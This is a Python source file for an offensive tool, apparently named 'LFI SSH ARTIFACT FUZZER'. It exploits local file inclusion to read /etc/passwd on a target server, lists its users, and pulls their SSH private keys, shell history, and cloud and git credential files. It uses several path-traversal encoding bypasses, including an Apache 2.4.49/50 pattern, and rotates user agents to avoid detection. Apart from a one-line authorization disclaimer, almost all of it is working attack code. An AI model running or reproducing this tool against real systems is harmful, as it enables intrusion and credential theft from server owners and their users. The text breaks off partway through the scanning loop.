#!/usr/bin/env python3
"""
Fuzzing made easy - LFI SSH ARTIFACT FUZZER
Enhanced version with advanced features for authorized penetration testing
"""

import http.client
import re
import sys
import os
import time
import random
import argparse
import json
import socket
from urllib.parse import quote_plus, urlparse
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime

# Try to import colorama for colored output
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    # Fallback if colorama not installed
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''
    COLORS = False

class LFI_SSH_Fuzzer:
    """Enhanced LFI SSH Artifact Fuzzer with advanced features"""
    
    def __init__(self, advanced_mode: bool = False):
        self.advanced_mode = advanced_mode
        self.config = {
            'user_agents': self._load_user_agents(),
            'rate_limit': 0.5,
            'proxy': None,
            'cookies': {},
            'headers': {},
            'timeout': 15,
            'max_depth': 2,
            'traversal_depth': 6,
            'verify_ssl': False,
            'follow_redirects': True
        }
        self.request_count = 0
        self.found_artifacts = []
        self.session_cookies = {}
        self.start_time = datetime.now()
        
        # Color setup
        if COLORS:
            self.colors = {
                'info': Fore.CYAN,
                'success': Fore.GREEN + Style.BRIGHT,
                'warning': Fore.YELLOW,
                'error': Fore.RED + Style.BRIGHT,
                'debug': Fore.MAGENTA,
                'highlight': Fore.WHITE + Style.BRIGHT,
                'banner': Fore.BLUE + Style.BRIGHT
            }
        else:
            self.colors = {k: '' for k in ['info', 'success', 'warning', 'error', 'debug', 'highlight', 'banner']}
    
    def _load_user_agents(self) -> List[str]:
        """Load user agents from file or use defaults"""
        default_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'curl/7.88.1',
            'python-requests/2.31.0',
            'Wget/1.21.4'
        ]
        
        # Try to load from file if in advanced mode
        if self.advanced_mode:
            ua_files = ['user_agents.txt', 'ua.txt', 'user-agents.txt']
            for ua_file in ua_files:
                if os.path.exists(ua_file):
                    try:
                        with open(ua_file, 'r', encoding='utf-8', errors='ignore') as f:
                            agents = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        if agents:
                            print(f"[*] Loaded {len(agents)} user agents from {ua_file}")
                            return agents + default_agents
                    except Exception as e:
                        print(f"[-] Error loading {ua_file}: {e}")
        
        return default_agents
    
    def _get_user_agent(self) -> str:
        """Get a random user agent"""
        return random.choice(self.config['user_agents']) if self.config['user_agents'] else "LFI-SSH-Fuzzer/1.0"
    
    def _apply_rate_limit(self):
        """Apply rate limiting between requests"""
        if self.config['rate_limit'] > 0:
            time.sleep(self.config['rate_limit'])
    
    def _print(self, message: str, level: str = 'info', end: str = '\n'):
        """Print with color coding"""
        color = self.colors.get(level, '')
        reset = Style.RESET_ALL if COLORS else ''
        print(f"{color}{message}{reset}", end=end)
    
    def show_banner(self):
        """Display enhanced banner"""
        banner = f"""
{self.colors['banner']}{'='*70}
 NUCLEAR SKELETON - LFI SSH ARTIFACT FUZZER v2.0
{'='*70}
 Author: RevShellXD
 Features: LFI Enumeration • SSH Artifact Discovery • Advanced Bypass
{'='*70}{Style.RESET_ALL if COLORS else ''}
"""
        print(banner)
        
        if self.advanced_mode:
            self._print("[*] ADVANCED MODE ENABLED", 'highlight')
            print("Features available:")
            print("  • User-Agent Rotation      • Rate Limiting")
            print("  • Proxy Support           • Custom Headers")
            print("  • Cookie Support          • Enhanced Detection")
            print("  • JSON Output             • Dry Run Mode")
            print(f"{'='*70}")
    
    def show_help(self):
        """Display comprehensive help"""
        help_text = f"""
{self.colors['highlight']}USAGE:
  python3 lfi_ssh_fuzzer.py [OPTIONS]

{self.colors['info']}BASIC USAGE (Interactive):
  python3 lfi_ssh_fuzzer.py
    - Prompts for target details interactively

{self.colors['info']}ADVANCED OPTIONS:
  -h, --help           Show this help message
  -adv, --advanced     Enable advanced mode with extra features
  --proxy URL          Proxy URL (e.g., http://127.0.0.1:8080)
  --rate FLOAT         Rate limit in seconds (default: 0.5)
  --ua-file FILE       Custom user agents file
  --cookies STRING     Cookie string (e.g., "session=abc123")
  --headers JSON       Additional headers as JSON string
  --timeout INT        Request timeout in seconds (default: 15)
  --depth INT          Directory traversal depth (default: 6)
  --max-depth INT      Recursive fuzzing depth (default: 2)
  --dry-run            Test configuration without making requests
  --output FILE        Save results to JSON file
  --no-color           Disable colored output
  --no-redirect        Don't follow redirects

{self.colors['success']}EXAMPLES:
  Basic scan:          python3 lfi_ssh_fuzzer.py
  Advanced mode:       python3 lfi_ssh_fuzzer.py -adv
  With proxy:          python3 lfi_ssh_fuzzer.py --proxy http://127.0.0.1:8080
  Rate limited:        python3 lfi_ssh_fuzzer.py --rate 1.0
  Custom cookies:      python3 lfi_ssh_fuzzer.py --cookies "PHPSESSID=abc123"
  Save results:        python3 lfi_ssh_fuzzer.py --output scan_results.json
  Dry run:             python3 lfi_ssh_fuzzer.py --dry-run

{self.colors['warning']}LEGAL DISCLAIMER:
  This tool is for authorized security testing only.
  Use only on systems you own or have permission to test.
{Style.RESET_ALL if COLORS else ''}
"""
        print(help_text)
    
    def encode_payload(self, payload: str, encoding: str, user_encoding: str = None) -> str:
        """
        Encodes the LFI payload according to the selected encoding type.
        Supports none, single, double, custom double, unicode, and user-defined encodings.
        """
        if encoding == 'none':
            return payload
        elif encoding == 'single':
            # Multiple single encoding variations
            variations = [
                ('../', '%2e%2e%2f'),
                ('../', '..%2f'),
                ('../', '%2e%2e/'),
                ('../', '.%2e/'),
                ('../', '..%252f')  # Sometimes works
            ]
            for pattern, replacement in variations:
                payload = payload.replace(pattern, replacement)
            return payload
        elif encoding == 'double':
            return payload.replace('../', '%252e%252e%252f')
        elif encoding == 'custom_double':
            return payload.replace('../', '%%32%65%%32%65/')
        elif encoding == 'unicode':
            # Unicode bypass variations
            variations = [
                ('../', '..∕'),      # Division slash
                ('../', '..／'),     # Fullwidth slash
                ('../', '..⧸'),      # Big solidus
                ('../', '%u002e%u002e/'),
                ('../', '..%c0%af'),  # UTF-8 overlong
            ]
            for pattern, replacement in variations:
                payload = payload.replace(pattern, replacement)
            return payload
        elif encoding == 'user_custom':
            if user_encoding is None:
                raise ValueError("User encoding string required")
            return payload.replace('../', user_encoding)
        else:
            return payload
    
    def send_raw_get(self, protocol: str, host: str, port: int, path: str, 
                    verbose: bool = False) -> Tuple[Optional[int], Optional[str]]:
        """
        Sends a raw HTTP GET request with advanced features.
        """
        self.request_count += 1
        self._apply_rate_limit()
        
        try:
            # Prepare headers
            headers = {
                'User-Agent': self._get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Cache-Control': 'no-cache'
            }
            
            # Add custom headers
            headers.update(self.config['headers'])
            
            # Add cookies if present
            if self.config['cookies']:
                cookie_str = '; '.join([f"{k}={v}" for k, v in self.config['cookies'].items()])
                headers['Cookie'] = cookie_str
            elif self.session_cookies:
                cookie_str = '; '.join([f"{k}={v}" for k, v in self.session_cookies.items()])
                headers['Cookie'] = cookie_str
            
            # Handle proxy if configured
            if self.config['proxy'] and protocol == 'http':
                # Simple proxy support for http
                try:
                    proxy = urlparse(self.config['proxy'])
                    conn = http.client.HTTPConnection(proxy.hostname, proxy.port or 8080, 
                                                     timeout=self.config['timeout'])
                    # Send full URL in request line for proxy
                    full_url = f"{protocol}://{host}:{port}{path}"
                    conn.request("GET", full_url, headers=headers)
                except Exception as e:
                    if verbose:
                        self._print(f"[DEBUG] Proxy error: {e}, falling back to direct", 'debug')
                    # Fallback to direct connection
                    conn = http.client.HTTPConnection(host, port, timeout=self.config['timeout'])
                    conn.request("GET", path, headers=headers)
            else:
                # Direct connection
                if protocol == 'https':
                    # Note: For full SSL verification, you'd need to adjust this
                    conn = http.client.HTTPSConnection(host, port, timeout=self.config['timeout'])
                else:
                    conn = http.client.HTTPConnection(host, port, timeout=self.config['timeout'])
                conn.request("GET", path, headers=headers)
            
            if verbose:
                self._print(f"[DEBUG] Request #{self.request_count}: {protocol}://{host}:{port}{path}", 'debug')
                if self.config['headers']:
                    self._print(f"[DEBUG] Custom headers: {self.config['headers']}", 'debug')
            
            # Get response
            resp = conn.getresponse()
            status = resp.status
            
            # Handle redirects if configured
            if status in [301, 302, 303, 307, 308] and self.config['follow_redirects']:
                location = resp.getheader('Location')
                if location:
                    if verbose:
                        self._print(f"[DEBUG] Following redirect to: {location}", 'debug')
                    # Update cookies from response
                    set_cookie = resp.getheader('Set-Cookie')
                    if set_cookie:
                        # Simple cookie parsing (for session tracking)
                        cookie_parts = set_cookie.split(';')[0].split('=')
                        if len(cookie_parts) == 2:
                            self.session_cookies[cookie_parts[0].strip()] = cookie_parts[1].strip()
                    
                    conn.close()
                    # Parse the redirect location
                    if location.startswith('http'):
                        redirect_url = urlparse(location)
                        return self.send_raw_get(redirect_url.scheme, redirect_url.hostname, 
                                               redirect_url.port or (443 if redirect_url.scheme == 'https' else 80),
                                               redirect_url.path + ('?' + redirect_url.query if redirect_url.query else ''),
                                               verbose)
                    elif location.startswith('/'):
                        return self.send_raw_get(protocol, host, port, location, verbose)
            
            content = resp.read()
            
            # Try to decode content
            try:
                # Check for gzip encoding
                if resp.getheader('Content-Encoding') == 'gzip':
                    import gzip
                    import io
                    content = gzip.GzipFile(fileobj=io.BytesIO(content)).read()
                
                content = content.decode('utf-8', errors='ignore')
            except:
                content = content.decode('latin-1', errors='ignore')
            
            # Update cookies from response
            set_cookie = resp.getheader('Set-Cookie')
            if set_cookie:
                cookie_parts = set_cookie.split(';')[0].split('=')
                if len(cookie_parts) == 2:
                    self.session_cookies[cookie_parts[0].strip()] = cookie_parts[1].strip()
            
            conn.close()
            
            if verbose:
                self._print(f"[DEBUG] Response HTTP {status} for {path}", 'debug')
            
            return status, content
            
        except socket.timeout:
            if verbose:
                self._print(f"[DEBUG] Timeout for {path}", 'debug')
            return None, None
        except Exception as e:
            if verbose:
                self._print(f"[DEBUG] Request error for {path}: {e}", 'debug')
            return None, None
    
    def parse_passwd(self, content: str) -> List[Dict[str, str]]:
        """Parse /etc/passwd content to extract valid users."""
        users = []
        for line in content.splitlines():
            parts = line.split(':')
            if len(parts) < 7:
                continue
            username, _, _, _, _, home_dir, shell = parts
            # Filter out system users with no login shell
            if username and username != 'root' and shell not in ['/usr/sbin/nologin', '/bin/false', '/sbin/nologin']:
                users.append({'username': username, 'home': home_dir})
        return users
    
    def is_directory_listing(self, content: str) -> bool:
        """Enhanced directory listing detection."""
        patterns = [
            r'<title>\s*Index of',
            r'<h1>\s*Index of',
            r'<h2>\s*Index of',
            r'Directory listing for',
            r'Parent Directory</a>',
            r'<img src="[^"]*blank\.(gif|png|ico)"',
            r'<table[^>]*summary="Directory Listing"',
            r'<table[^>]*class="indexlist"',
            r'Last modified</th>',
            r'Size</th>',
            r'<a href="\?C=[A-Z];O=[A-Z]">',
            r'<pre><A HREF="\?C=N&O=A">Name</A>',
            r'<pre></pre>',
            r'<ul class="dirlist">',
            r'<li class="dir">'
        ]
        
        # Check for multiple patterns
        match_count = 0
        for pattern in patterns:
            if re.search(pattern, content, re.IGNORECASE):
                match_count += 1
        
        # Also check for href links to parent directory
        if re.search(r'href="\.\./"', content, re.IGNORECASE):
            match_count += 2
        
        # Check for file listing patterns
        if re.search(r'<a href="[^"]*?">[^<]*?</a>\s*\d{2,4}-[A-Za-z]{3}-\d{2,4}', content):
            match_count += 2
        
        return match_count >= 2
    
    def extract_filenames_from_listing(self, content: str) -> List[str]:
        """Extract filenames from directory listing."""
        filenames = []
        
        # Multiple patterns for different listing formats
        patterns = [
            r'href="([^"?][^"]*)"',
            r'>\s*([^<\s]+?)\s*</a>',
            r'<td><a[^>]*>([^<]+)</a></td>',
            r'<li><a[^>]*>([^<]+)</a></li>',
            r'<A HREF="([^"]+)">([^<]+)</A>',
            r'<a[^>]*href="([^"]+)"[^>]*>([^<]+)</a>'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    # Some patterns return tuples (href, text)
                    filename = match[0] if match[0] else match[1]
                else:
                    filename = match
                
                if filename and filename not in ['../', './', '/'] and not filename.startswith('?'):
                    # Clean up the filename
                    clean = filename.split('"')[0] if '"' in filename else filename
                    clean = clean.split('#')[0]  # Remove anchors
                    clean = clean.split('?')[0]  # Remove query strings
                    
                    # Skip common non-files
                    if clean.lower() in ['name', 'last modified', 'size', 'description']:
                        continue
                    
                    # Skip JavaScript and CSS
                    if clean.lower().endswith(('.js', '.css', '.ico', '.png', '.jpg', '.gif')):
                        continue
                    
                    filenames.append(clean)
        
        return list(set(filenames))  # Remove duplicates
    
    def is_ssh_artifact(self, content: str) -> bool:
        """Detect SSH artifacts with enhanced patterns."""
        private_key_patterns = [
            r'-----BEGIN [A-Z ]*PRIVATE KEY-----',
            r'BEGIN OPENSSH PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'BEGIN DSA PRIVATE KEY',
            r'BEGIN EC PRIVATE KEY',
            r'BEGIN PRIVATE KEY',
            r'PuTTY-User-Key-File-2:',
            r'Private-Lines:',
            r'---- BEGIN SSH2 ENCRYPTED PRIVATE KEY',
            r'-----BEGIN SSH2 ENCRYPTED PRIVATE KEY'
        ]
        
        public_key_prefixes = [
            'ssh-rsa',
            'ssh-ed25519',
            'ecdsa-sha2-nistp256',
            'ecdsa-sha2-nistp384',
            'ecdsa-sha2-nistp521',
            'ssh-dss',
            'ssh-rsa-cert-v01@openssh.com',
            'ssh-ed25519-cert-v01@openssh.com',
            'sk-ssh-ed25519@openssh.com',
            'sk-ecdsa-sha2-nistp256@openssh.com'
        ]
        
        # Check for private keys
        for pattern in private_key_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # Check for public keys
        lines = content.splitlines()
        for line in lines:
            line = line.strip()
            # Skip comments and empty lines
            if not line or line.startswith('#'):
                continue
            
            for prefix in public_key_prefixes:
                if line.startswith(prefix):
                    return True
        
        # Check for known_hosts format
        if re.search(r'^\S+ (ssh-(rsa|dss|ed25519) )?AAAA[^ ]+', content, re.MULTILINE):
            return True
        
        # Check for SSH config patterns
        ssh_config_keywords = ['host ', 'identityfile', 'pubkeyauthentication', 'passwordauthentication',
                              'permitrootlogin', 'authorizedkeysfile', 'match ', 'include ']
        content_lower = content.lower()
        for keyword in ssh_config_keywords:
            if keyword in content_lower:
                # Additional check to avoid false positives
                lines_with_keyword = [l for l in lines if keyword in l.lower()]
                if len(lines_with_keyword) >= 1:
                    return True
        
        # Check for bash history with SSH commands
        ssh_commands = ['ssh ', 'scp ', 'sftp ', 'ssh-keygen', 'ssh-add', 'ssh-copy-id']
        for cmd in ssh_commands:
            if cmd in content and len(content.split('\n')) > 1:
                return True
        
        return False
    
    def save_artifact(self, user: str, path: str, content: str, status: int):
        """Save artifact and log result."""
        # Create output directory if it doesn't exist
        if not os.path.exists('artifacts'):
            os.makedirs('artifacts')
        
        filename = os.path.basename(path) if os.path.basename(path) else 'unknown'
        safe_user = re.sub(r'[^a-zA-Z0-9_.-]', '_', user)
        safe_filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
        
        # Generate unique filename if exists
        filepath = f"artifacts/{safe_user}_{safe_filename}"
        counter = 1
        while os.path.exists(filepath):
            filepath = f"artifacts/{safe_user}_{safe_filename}_{counter}"
            counter += 1
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            
            # Also save metadata
            metadata = {
                'user': user,
                'original_path': path,
                'saved_path': filepath,
                'http_status': status,
                'size': len(content),
                'timestamp': datetime.now().isoformat()
            }
            
            self.found_artifacts.append(metadata)
            self._print(f"[+] Saved artifact to {filepath} ({len(content)} bytes)", 'success')
            
        except Exception as e:
            self._print(f"[-] Failed to save artifact: {e}", 'error')
    
    def save_results(self, output_file: str = None):
        """Save scan results to JSON file."""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"scan_results_{timestamp}.json"
        
        results_data = {
            'scan_start': self.start_time.isoformat(),
            'scan_end': datetime.now().isoformat(),
            'total_requests': self.request_count,
            'artifacts_found': len(self.found_artifacts),
            'artifacts': self.found_artifacts,
            'config': {
                'rate_limit': self.config['rate_limit'],
                'traversal_depth': self.config['traversal_depth'],
                'max_depth': self.config['max_depth'],
                'proxy_used': bool(self.config['proxy']),
                'user_agents_count': len(self.config['user_agents'])
            }
        }
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results_data, f, indent=2, ensure_ascii=False)
            self._print(f"[+] Results saved to {output_file}", 'success')
        except Exception as e:
            self._print(f"[-] Failed to save results: {e}", 'error')
    
    def recursive_fuzz(self, protocol: str, host: str, port: int, base_url: str, 
                      encoding: str, user_encoding: str, user: str, path: str, 
                      depth: int, max_depth: int, visited: Set, lfi_type: str, 
                      param_name: str = None, verbose: bool = False):
        """Recursively fuzz files and directories."""
        if depth > max_depth:
            return
        
        if path in visited:
            return
        visited.add(path)
        
        encoded_path = self.encode_payload(path, encoding, user_encoding).lstrip('/')
        
        # Construct full URL path depending on LFI type
        if lfi_type == 'path':
            full_path = base_url.rstrip('/') + '/' + encoded_path
        elif lfi_type == 'param':
            if encoding == 'none':
                full_path = f"{base_url}?{param_name}={encoded_path}"
            else:
                encoded_query = quote_plus(encoded_path)
                full_path = f"{base_url}?{param_name}={encoded_query}"
        else:
            if verbose:
                self._print(f"[DEBUG] Unknown LFI type: {lfi_type}", 'debug')
            return
        
        status, content = self.send_raw_get(protocol, host, port, full_path, verbose)
        if status is None:
            return
        
        if status == 404:
            if verbose:
                self._print(f"[DEBUG] Skipping {full_path} due to HTTP 404", 'debug')
            return
        
        # Accept various status codes that might contain content
        if status not in [200, 403, 400, 401, 500, 301, 302, 206]:
            if verbose:
                self._print(f"[DEBUG] Skipping {full_path} due to HTTP {status}", 'debug')
            return
        
        # Handle redirects
        if status in [301, 302]:
            if verbose:
                self._print(f"[DEBUG] Redirect detected for {full_path}", 'debug')
            return
        
        # Check if it's a directory listing
        if path.endswith('/') and self.is_directory_listing(content):
            self._print(f"[*] Directory listing found at {full_path} (depth {depth})", 'info')
            filenames = self.extract_filenames_from_listing(content)
            
            for fname in filenames:
                if fname in ['../', './', '/', '.', '..']:
                    continue
                
                # Handle different path formats
                if fname.startswith('/'):
                    new_path = fname.lstrip('/')
                else:
                    new_path = path + fname
                
                # Ensure proper directory structure
                if fname.endswith('/') and not new_path.endswith('/'):
                    new_path += '/'
                elif not fname.endswith('/') and path.endswith('/'):
                    pass  # Already correct
                elif not fname.endswith('/') and not path.endswith('/'):
                    new_path = path + '/' + fname if path else fname
                
                if fname.endswith('/'):
                    self.recursive_fuzz(protocol, host, port, base_url, encoding, 
                                       user_encoding, user, new_path, depth+1, 
                                       max_depth, visited, lfi_type, param_name, verbose)
                else:
                    self.recursive_fuzz(protocol, host, port, base_url, encoding, 
                                       user_encoding, user, new_path, depth+1, 
                                       max_depth, visited, lfi_type, param_name, verbose)
        else:
            # Check for SSH artifacts
            if self.is_ssh_artifact(content):
                self._print(f"[+] SSH artifact found for user {user} at {full_path} (HTTP {status})", 'success')
                self.save_artifact(user, path, content, status)
            elif verbose and content.strip():
                self._print(f"[DEBUG] No SSH artifact found at {full_path} (HTTP {status})", 'debug')
    
    def interactive_setup(self, args):
        """Handle interactive setup with optional advanced features."""
        
        if self.advanced_mode:
            self._print("\n[*] ADVANCED CONFIGURATION", 'highlight')
            print("-" * 40)
            
            # User Agent configuration
            if not args.ua_file:
                ua_choice = input("Use custom User-Agent file? (y/N): ").strip().lower()
                if ua_choice == 'y':
                    ua_file = input("Path to user agents file: ").strip()
                    if os.path.exists(ua_file):
                        try:
                            with open(ua_file, 'r', encoding='utf-8', errors='ignore') as f:
                                agents = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                            if agents:
                                self.config['user_agents'] = agents + self.config['user_agents']
                                self._print(f"[+] Loaded {len(agents)} user agents", 'success')
                        except Exception as e:
                            self._print(f"[-] Error loading file: {e}", 'error')
            
            # Rate limiting
            if not args.rate:
                rate_input = input(f"Rate limit in seconds (default: {self.config['rate_limit']}): ").strip()
                if rate_input:
                    try:
                        self.config['rate_limit'] = float(rate_input)
                    except ValueError:
                        self._print("[-] Invalid rate, using default", 'error')
            
            # Proxy configuration
            if not args.proxy:
                proxy_choice = input("Use proxy? (y/N): ").strip().lower()
                if proxy_choice == 'y':
                    proxy_url = input("Proxy URL (e.g., http://127.0.0.1:8080): ").strip()
                    if proxy_url:
                        self.config['proxy'] = proxy_url
            
            # Cookies
            if not args.cookies:
                cookie_choice = input("Add cookies? (y/N): ").strip().lower()
                if cookie_choice == 'y':
                    cookie_str = input('Cookie string (e.g., "session=abc123; auth=xyz"): ').strip()
                    if cookie_str:
                        try:
                            cookies = {}
                            for cookie in cookie_str.split(';'):
                                if '=' in cookie:
                                    key, value = cookie.strip().split('=', 1)
                                    cookies[key] = value
                            self.config['cookies'] = cookies
                        except:
                            self._print("[-] Invalid cookie format", 'error')
            
            # Headers
            if not args.headers:
                header_choice = input("Add custom headers? (y/N): ").strip().lower()
                if header_choice == 'y':
                    print("Enter headers as JSON (e.g., {\"X-Forwarded-For\":\"192.168.1.1\"})")
                    header_json = input("Headers: ").strip()
                    if header_json:
                        try:
                            self.config['headers'] = json.loads(header_json)
                        except json.JSONDecodeError:
                            self._print("[-] Invalid JSON", 'error')
            
            # Timeout
            if not args.timeout:
                timeout_input = input(f"Request timeout in seconds (default: {self.config['timeout']}): ").strip()
                if timeout_input:
                    try:
                        self.config['timeout'] = int(timeout_input)
                    except ValueError:
                        self._print("[-] Invalid timeout, using default", 'error')
            
            print("-" * 40)
        
        # Original interactive prompts
        self._print("\n[*] TARGET CONFIGURATION", 'highlight')
        print("-" * 40)
        
        # Protocol
        while True:
            protocol = input("Enter protocol (http or https): ").strip().lower()
            if protocol in ['http', 'https']:
                break
            self._print("Invalid protocol. Must be 'http' or 'https'.", 'error')
        
        # Port
        while True:
            port_str = input("Enter port (e.g., 80, 443): ").strip()
            if port_str.isdigit() and 1 <= int(port_str) <= 65535:
                port = int(port_str)
                break
            self._print("Invalid port. Must be between 1 and 65535.", 'error')
        
        # Target
        target_ip = input("Enter target IP or domain: ").strip()
        
        # LFI Type
        while True:
            lfi_type = input("Is the LFI a path segment or a query parameter? (enter 'path' or 'param'): ").strip().lower()
            if lfi_type in ['path', 'param']:
                break
            self._print("Invalid LFI type. Must be 'path' or 'param'.", 'error')
        
        # Base URL/Path
        if lfi_type == 'path':
            lfi_ext = input("Enter LFI base path (e.g., cgi-bin): ").strip().rstrip('/')
            base_url = f"{protocol}://{target_ip}:{port}/{lfi_ext}"
            param_name = None
        else:
            base_url = input("Enter full base URL (e.g., http://example.com/subdirectory/index.php): ").strip().rstrip('/')
            param_name = input("Enter LFI parameter name (e.g., page) - '?' and '=' are added automatically: ").strip()
        
        # Verbose mode
        verbose_input = input("Enable verbose output? (y/N): ").strip().lower()
        verbose = verbose_input == 'y'
        
        # Traversal depth
        if not args.depth:
            traversal_depth_str = input(f"Enter traversal depth (default: {self.config['traversal_depth']}): ").strip()
            if traversal_depth_str.isdigit():
                self.config['traversal_depth'] = int(traversal_depth_str)
        TRAVERSAL_PREFIX = '../' * self.config['traversal_depth']
        
        # Encoding options
        print("\nSelect encoding type:")
        print("1) None")
        print("2) Single encoding (e.g., %2e%2e%2f)")
        print("3) Double encoding (standard, e.g., %252e%252e%252f)")
        print("4) Custom double encoding (Apache 2.4.49/50 exploit pattern)")
        print("5) Unicode encoding (various Unicode bypasses)")
        print("6) Enter your own custom encoding")
        
        while True:
            choice = input("Choice (1-6): ").strip()
            encoding_map = {
                '1': 'none',
                '2': 'single',
                '3': 'double',
                '4': 'custom_double',
                '5': 'unicode',
                '6': 'user_custom'
            }
            encoding = encoding_map.get(choice)
            if encoding:
                break
            self._print("Invalid choice. Enter 1-6.", 'error')
        
        user_encoding = None
        if encoding == 'user_custom':
            user_encoding = input("Enter your custom encoding string to replace '../': ").strip()
        
        # Max recursive depth
        if not args.max_depth:
            max_depth_str = input(f"Enter max recursive depth (default: {self.config['max_depth']}): ").strip()
            if max_depth_str.isdigit():
                self.config['max_depth'] = int(max_depth_str)
        
        return {
            'protocol': protocol,
            'host': target_ip,
            'port': port,
            'base_url': base_url,
            'lfi_type': lfi_type,
            'param_name': param_name,
            'verbose': verbose,
            'traversal_prefix': TRAVERSAL_PREFIX,
            'encoding': encoding,
            'user_encoding': user_encoding,
            'max_depth': self.config['max_depth']
        }
    
    def run_scan(self, config, dry_run=False):
        """Run the main scan."""
        self._print("\n[*] STARTING SCAN", 'highlight')
        print("-" * 40)
        
        if dry_run:
            self._print("[*] DRY RUN MODE - No requests will be made", 'warning')
            print(f"Target: {config['protocol']}://{config['host']}:{config['port']}")
            print(f"LFI Type: {config['lfi_type']}")
            print(f"Base URL: {config['base_url']}")
            if config['param_name']:
                print(f"Parameter: {config['param_name']}")
            print(f"Encoding: {config['encoding']}")
            print(f"Traversal Depth: {self.config['traversal_depth']}")
            print(f"Rate Limit: {self.config['rate_limit']}s")
            print(f"User Agents: {len(self.config['user_agents'])} loaded")
            return
        
        # Try to read /etc/passwd first
        lfi_payload = config['traversal_prefix'] + 'etc/passwd'
        encoded_payload = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding']).lstrip('/')
        
        if config['lfi_type'] == 'path':
            passwd_path = config['base_url'].rstrip('/') + '/' + encoded_payload
        else:
            if config['encoding'] == 'none':
                passwd_path = f"{config['base_url']}?{config['param_name']}={encoded_payload}"
            else:
                encoded_query = quote_plus(encoded_payload)
                passwd_path = f"{config['base_url']}?{config['param_name']}={encoded_query}"
        
        self._print(f"[*] Attempting to read /etc/passwd from: {passwd_path}", 'info')
        
        status, passwd_content = self.send_raw_get(config['protocol'], config['host'], config['port'], 
                                                  passwd_path, config['verbose'])
        
        if status != 200 or not passwd_content:
            self._print(f"[-] Failed to retrieve /etc/passwd. HTTP status: {status}", 'error')
            if config['verbose'] and passwd_content:
                self._print(f"Response preview:\n{passwd_content[:500]}...", 'debug')
            return
        
        self._print("[+] Successfully retrieved /etc/passwd", 'success')
        
        # Parse users
        users = self.parse_passwd(passwd_content)
        if not users:
            self._print("[-] No valid users found in /etc/passwd after filtering.", 'error')
            return
        
        # Filter users with valid home directories
        valid_users = []
        for u in users:
            if u['home'].startswith('/home/') or u['home'] == '/root':
                valid_users.append(u)
            elif config['verbose']:
                self._print(f"[-] Skipping user {u['username']} with home directory: {u['home']}", 'debug')
        
        if not valid_users:
            self._print("[-] No users with valid home directories to scan.", 'error')
            return
        
        self._print(f"[+] Found {len(valid_users)} valid users:", 'success')
        for u in valid_users:
            self._print(f"  • {u['username']}: {u['home']}", 'info')
        
        # SSH artifact suffixes to check
        suffixes = [
            '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/id_ecdsa', '.ssh/id_ed25519',
            '.ssh/id_rsa.pub', '.ssh/id_dsa.pub', '.ssh/id_ecdsa.pub', '.ssh/id_ed25519.pub',
            '.ssh/authorized_keys', '.ssh/authorized_keys2', '.ssh/known_hosts',
            '.ssh/config', '.ssh/id_rsa.bak', '.ssh/id_rsa.old', '.ssh/id_rsa~',
            '.ssh/.id_rsa.swp', '.ssh/id_rsa.tmp', '.ssh/id_rsa.1', '.ssh/id_rsa.pem',
            '.ssh/id_rsa.ppk', '.ssh/identity', '.ssh/identity.pub', '.ssh/environment',
            '.ssh/rc', '.bash_history', '.ssh/id_ed25519.bak', '.ssh/id_ed25519.old',
            '.ssh/known_hosts.old', '.ssh/config.bak', '.netrc', '.git-credentials',
            '.aws/credentials', '.docker/config.json'
        ]
        
        self._print(f"\n[*] Starting SSH artifact fuzzing for {len(valid_users)} users...", 'info')
        
        for user in valid_users:
            home_dir = user['home']
            username = user['username']
            
            # Ensure home_dir ends with slash
            if not home_dir.endswith('/'):
                home_dir += '/'
            
            clean_home_dir = home_dir.lstrip('/')
            home_path = config['traversal_prefix'] + clean_home_dir
            if not home_path.endswith('/'):
                home_path += '/'
            
            # Check if home directory is accessible
            if config['lfi_type'] == 'path':
                encoded_home_path = self.encode_payload(home_path, config['encoding'], 
                                                       config['user_encoding']).lstrip('/')
                home_url_path = config['base_url'].rstrip('/') + '/' + encoded_home_path
            else:
                encoded_home_path = self.encode_payload(home_path, config['encoding'], 
                                                       config['user_encoding'])
                if config['encoding'] == 'none':
                    home_url_path = f"{config['base_url']}?{config['param_name']}={encoded_home_path}"
                else:
                    encoded_query = quote_plus(encoded_home_path)
                    home_url_path = f"{config['base_url']}?{config['param_name']}={encoded_query}"
            
            if config['verbose']:
                self._print(f"[DEBUG] Checking home directory: {home_url_path}", 'debug')
            
            status, _ = self.send_raw_get(config['protocol'], config['host'], config['port'], 
                                         home_url_path, config['verbose'])
            
            if status == 404:
                if config['verbose']:
                    self._print(f"[-] Skipping user {username}: home directory not found (HTTP 404)", 'debug')
                continue
            
